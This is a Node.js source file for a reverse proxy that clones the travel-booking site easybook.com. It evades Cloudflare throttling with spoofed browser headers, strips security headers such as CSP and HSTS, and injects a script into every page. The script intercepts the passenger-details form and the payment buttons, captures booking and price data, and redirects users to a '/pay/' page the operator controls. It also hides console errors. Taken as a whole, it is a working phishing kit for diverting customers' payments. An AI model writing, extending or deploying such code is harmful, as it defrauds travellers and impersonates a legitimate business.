import { createProxyMiddleware } from 'http-proxy-middleware';
import https from 'https';
import zlib from 'zlib';

const TARGET_URL = process.env.TARGET_URL || 'https://www.easybook.com';
const targetHost = new URL(TARGET_URL).host;

const EASYBOOK_DOMAINS = 'www\\.easybook\\.com|easybook\\.com';

const agent = new https.Agent({ keepAlive: true, maxSockets: 1, maxFreeSockets: 1, timeout: 30000 });

// Request queue - serialize upstream requests to avoid Cloudflare rate limiting
let lastReqTime = 0;
const MIN_GAP = 2000;
const MAX_GAP = 5000;
let currentGap = MIN_GAP;
function queueUpstream() {
  const now = Date.now();
  const wait = Math.max(0, currentGap - (now - lastReqTime));
  lastReqTime = now + wait;
  if (wait > 0) return new Promise(r => setTimeout(r, wait));
  return Promise.resolve();
}
function slowDown() { currentGap = Math.min(currentGap * 2, MAX_GAP); }
function speedUp() { currentGap = Math.max(MIN_GAP, currentGap * 0.8); }

// Circuit breaker
const circuitBreaker = { failures: 0, open: false, openedAt: 0, cooldownMs: 15000 };
function isCircuitOpen() {
  if (!circuitBreaker.open) return false;
  if (Date.now() - circuitBreaker.openedAt > circuitBreaker.cooldownMs) {
    circuitBreaker.open = false;
    circuitBreaker.failures = 0;
    return false;
  }
  return true;
}
function recordFailure() {
  circuitBreaker.failures++;
  if (circuitBreaker.failures >= 8 && !circuitBreaker.open) {
    circuitBreaker.open = true;
    circuitBreaker.openedAt = Date.now();
    circuitBreaker.cooldownMs = Math.min(circuitBreaker.cooldownMs * 2, 60000);
  }
}
function recordSuccess() {
  if (circuitBreaker.open || circuitBreaker.failures > 0) {
    circuitBreaker.open = false;
    circuitBreaker.failures = 0;
    circuitBreaker.cooldownMs = 15000;
  }
}

// Stale cache support
const STALE_TTL = 120 * 60 * 1000;
function cacheGetStale(key, ttl) {
  const e = cache.get(key);
  if (!e) return null;
  const age = Date.now() - e.ts;
  if (age <= ttl) return { data: e.data, fresh: true };
  if (age <= ttl + STALE_TTL) return { data: e.data, fresh: false, stale: true };
  cache.delete(key);
  return null;
}

const cache = new Map();
const HTML_TTL = 3 * 60 * 1000;
function cacheKey(req) { return req.method + ':' + req.url; }
function cacheGet(key, ttl) {
  const e = cache.get(key);
  if (!e) return null;
  if (Date.now() - e.ts <= ttl) return e.data;
  cache.delete(key);
  return null;
}
function cacheSet(key, data) {
  if (cache.size > 1000) cache.delete(cache.keys().next().value);
  cache.set(key, { data, ts: Date.now() });
}

const injectionScript = `<script>
(function(){
  'use strict';

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string' && /https?:\\/\\/(?:www\\.)?easybook\\.com/.test(input)) {
      input = input.replace(/https?:\\/\\/(?:www\\.)?easybook\\.com/gi, '');
    }
    return _fetch.call(window, input, init);
  };

  var _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string' && /https?:\\/\\/(?:www\\.)?easybook\\.com/.test(url)) {
      url = url.replace(/https?:\\/\\/(?:www\\.)?easybook\\.com/gi, '');
    }
    return _open.apply(this, arguments);
  };

  document.addEventListener('submit', function(e) {
    var form = e.target;
    var action = (form.getAttribute('action') || '').toLowerCase();
    var isPassengerDetails = /passengerdetails/.test(action);

    if (!isPassengerDetails) return;

    e.preventDefault();
    e.stopPropagation();

    var data = extractBookingData();
    if (!data) {
      form.submit();
      return;
    }

    try {
      sessionStorage.setItem('easybook_booking', JSON.stringify(data));
    } catch(ex) {}

    window.location.href = '/pay/';
  }, true);

  function extractBookingData() {
    var data = {};

    var vmInput = document.getElementById('hdSearchViewModel') || document.getElementById('SearchViewModelJson') || document.querySelector('[id*="SearchViewModel"]');
    if (vmInput) {
      try {
        var vm = JSON.parse(vmInput.value);
        data.productType = vm.ProductType || '';
        data.origin = vm.Origin || '';
        data.destination = vm.Destination || '';
        data.departureDate = vm.DepartureDate || '';
        data.pax = vm.Pax || 1;
        data.tripType = vm.TripType;
        data.currency = vm.SelectedCurrency || 'MYR';
      } catch(ex) {}
    }

    var bodyText = document.body.innerText || '';
    var routeMatch = bodyText.match(/([A-Za-z\\s]+)\\s+(?:to|-|→)\\s+([A-Za-z\\s]+)/i);
    if (routeMatch && !data.origin) {
      data.origin = routeMatch[1].trim();
      data.destination = routeMatch[2].trim();
    }

    var priceEls = document.querySelectorAll('[class*="price"], [class*="total"], [class*="amount"], [class*="Total"], .grand-total, .total-price');
    for (var i = 0; i < priceEls.length; i++) {
      var pt = priceEls[i].textContent || '';
      var pm = pt.match(/[RM$€£¥]?\\s*([\\d,]+\\.?\\d*)/);
      if (pm) {
        data.amount = pm[1].replace(/,/g, '');
        data.currencySymbol = pm[0].replace(/[\\d,.\\s]/g, '');
        break;
      }
    }

    var h1 = document.querySelector('h1');
    if (h1) {
      var titleText = h1.textContent || '';
      if (/bus/i.test(titleText)) data.productType = 'Bus';
      if (/train/i.test(titleText)) data.productType = 'Train';
      if (/ferry|fastboat/i.test(titleText)) data.productType = 'Ferry';
      if (/entrance|attraction|pass/i.test(titleText)) data.productType = 'EntrancePass';
    }

    var tripKey = document.querySelector('[name="SelectedDepartTripKey"]');
    if (tripKey) data.tripKey = tripKey.value;
    var seatList = document.querySelector('[name="SelectedDepartTripSeatList"]');
    if (seatList) data.seats = seatList.value;

    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';

    return data;
  }

  function hookPayButtons() {
    var btns = document.querySelectorAll('button, input[type="submit"], a');
    for (var i = 0; i < btns.length; i++) {
      if (btns[i].__payHooked) continue;
      btns[i].__payHooked = true;
      var text = (btns[i].textContent || btns[i].value || '').toLowerCase();
      if (/pay now|proceed to pay|make payment|continue to pay|checkout/i.test(text)) {
        btns[i].addEventListener('click', function(e) {
          var data = extractBookingData();
          if (data && data.origin) {
            try { sessionStorage.setItem('easybook_booking', JSON.stringify(data)); } catch(e2) {}
            window.location.href = '/pay/';
          }
        });
      }
    }
  }
  hookPayButtons();
  new MutationObserver(hookPayButtons).observe(document.documentElement, { childList: true, subtree: true });

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
  var _ce = console.error;
  console.error = function() {
    var msg = arguments[0];
    if (typeof msg === 'string' && /unable|error|fail|exception/i.test(msg)) return;
    return _ce.apply(console, arguments);
  };
})();
</script>`;

export function createEasybookProxy(publicHost) {
  const rewriteHost = publicHost || 'localhost';

  // Circuit breaker middleware (only for page navigation, not static/API)
  const circuitMiddleware = (req, res, next) => {
    // Skip static files and API calls — only guard HTML page loads
    if (req.url.match(/\.(js|css|png|jpg|jpeg|gif|svg|ico|webp|woff2?|json|ashx|xml|txt)(\?|$)/i)) return next();
    if (req.url.startsWith('/api/') || req.url.startsWith('/images/') || req.url.startsWith('/BotDetect')) return next();

    if (!isCircuitOpen()) return next();
    const ck = cacheKey(req);
    const cached = cacheGetStale(ck, Infinity);
    if (cached) {
      if (!res.headersSent) {
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'x-served-from': 'circuit-breaker' });
        res.end(cached.data);
      }
      return;
    }
    if (!res.headersSent) {
      res.writeHead(503, { 'content-type': 'text/html; charset=utf-8', 'retry-after': '5', 'cache-control': 'no-store' });
      res.end('<!DOCTYPE html><html><head><meta charset="utf-8"></head><body style="font-family:sans-serif;text-align:center;padding:50px;background:#111;color:#eee"><h2 style="color:#999">⏳</h2><p>Loading... please wait and refresh.</p></body></html>');
    }
  };

  const proxy = createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    secure: false,
    agent,
    proxyTimeout: 15000,
    timeout: 15000,
    selfHandleResponse: true,
    headers: {
      Host: targetHost,
      origin: 'https://www.easybook.com',
      referer: 'https://www.easybook.com/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
      'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ms;q=0.6',
      'accept-encoding': 'identity',
      'cache-control': 'no-cache',
      'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not?A_Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    },
    on: {
      proxyRes: (proxyRes, req, res) => {
        if (res.headersSent) { proxyRes.resume(); return; }
        const statusCode = proxyRes.statusCode || 200;
        const ct = String(proxyRes.headers['content-type'] || '').split(';')[0];

        // Cloudflare errors: serve from cache, slow down upstream
        if (statusCode === 403 || statusCode === 429 || statusCode === 503 || statusCode === 520) {
          recordFailure();
          slowDown();
          proxyRes.resume();
          if (res.headersSent) return;
          const ck = cacheKey(req);
          const cached = cacheGetStale(ck, Infinity);
          if (cached) {
            res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
            res.end(cached.data);
          } else {
            res.writeHead(503, { 'content-type': 'text/html; charset=utf-8', 'retry-after': '5' });
            res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="5"></head><body style="font-family:sans-serif;text-align:center;padding:50px"><h2>503</h2><p>Upstream temporarily unavailable. Retrying in 5s...</p></body></html>');
          }
          return;
        }
        if (statusCode >= 200 && statusCode < 300) { recordSuccess(); speedUp(); }
        const isHtml = ct === 'text/html';

        delete proxyRes.headers['content-security-policy'];
        delete proxyRes.headers['content-security-policy-report-only'];
        delete proxyRes.headers['x-frame-options'];
        delete proxyRes.headers['x-content-type-options'];
        delete proxyRes.headers['strict-transport-security'];

        if (statusCode >= 300 && statusCode < 400 && proxyRes.headers['location']) {
          proxyRes.headers['location'] = proxyRes.headers['location']
            .replace(new RegExp(`https?://(?:www\\.)?easybook\\.com`, 'gi'), '')
            .replace(/^\/\//, '/');
        }

        if (!isHtml) {
          const headers = {};
          Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding') headers[k] = proxyRes.headers[k]; });
          res.writeHead(statusCode, headers);
          proxyRes.pipe(res);
          return;
        }

        const ck = cacheKey(req);
        if (req.method === 'GET') {
          const cached = cacheGetStale(ck, HTML_TTL);
          if (cached) {
            if (!res.headersSent) {
              res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=180', 'content-length': String(cached.data.length) });
              res.end(cached.data);
            }
            return;
          }
        }

        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          try {
            let body = Buffer.concat(chunks);
            const ce = proxyRes.headers['content-encoding'];
            if (ce) {
              try {
                if (ce.includes('br')) body = zlib.brotliDecompressSync(body);
                else body = zlib.gunzipSync(body);
              } catch {}
            }
            let html = body.toString('utf8');
            html = rewriteHtml(html, rewriteHost);
            body = Buffer.from(html, 'utf8');
            if (req.method === 'GET') cacheSet(ck, body);
            const headers = {};
            Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding' && k !== 'content-encoding') headers[k] = proxyRes.headers[k]; });
            headers['content-length'] = String(body.length);
            res.writeHead(statusCode, headers);
            res.end(body);
          } catch (err) {
            console.error('[Rewrite]', err.message);
            if (!res.headersSent) { res.writeHead(502); res.end(); }
          }
        });
        proxyRes.on('error', () => { if (!res.headersSent) { res.writeHead(502); res.end(); } });
      },
      error: (err, req, res) => {
        if (res.headersSent) return;
        recordFailure();
        slowDown();
        console.error('[Proxy]', err.message);
        const ck = cacheKey(req);
        const stale = cacheGetStale(ck, Infinity);
        if (stale) {
          res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
          res.end(stale.data);
          return;
        }
        res.writeHead(503, { 'content-type': 'text/plain' });
        res.end('Temporarily unavailable');
      },
    },
  });

  return [circuitMiddleware, proxy];
}

function rewriteHtml(html, host) {
  const domainRe = new RegExp(`https?://(?:${EASYBOOK_DOMAINS})`, 'gi');

  html = html.replace(domainRe, '');

  html = html.replace(/((?:src|srcSet|href)=")(\/\/easycdn\.)/gi, '$1https://easycdn.');

  html = html.replace(/<head[^>]*>/i, m => `${m}\n<base href="/">`);

  html = html.replace(/<script[^>]*googletagmanager[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*googletagmanager[^>]*\/>/gi, '');
  html = html.replace(/<script[^>]*google-analytics[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<noscript[^>]*googletagmanager[\s\S]*?<\/noscript>/gi, '');
  html = html.replace(/<iframe[^>]*googletagmanager[\s\S]*?<\/iframe>/gi, '');
  html = html.replace(/<script[^>]*hotjar[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*cloudflareinsights[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*zenclerk[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*static\.cloudflareinsights[^>]*\/>/gi, '');
  html = html.replace(/<iframe[^>]*google\.com\/maps[^>]*>[\s\S]*?<\/iframe>/gi, '');

  html = html.replace('</body>', `${injectionScript}\n</body>`);

  // Remove app promotion & referral elements
  html = html.replace(/<li[^>]*easybook-app-qrcode[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<li[^>]*mobilenumber-modal[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<li[^>]*header-menu-icon[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<a[^>]*referral[\s\S]*?<\/a>/gi, '');
  html = html.replace(/<li[^>]*referral[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<div[^>]*app-download[\s\S]*?<\/div>/gi, '');
  html = html.replace(/<div[^>]*mobile-app[\s\S]*?<\/div>/gi, '');

  return html;
}
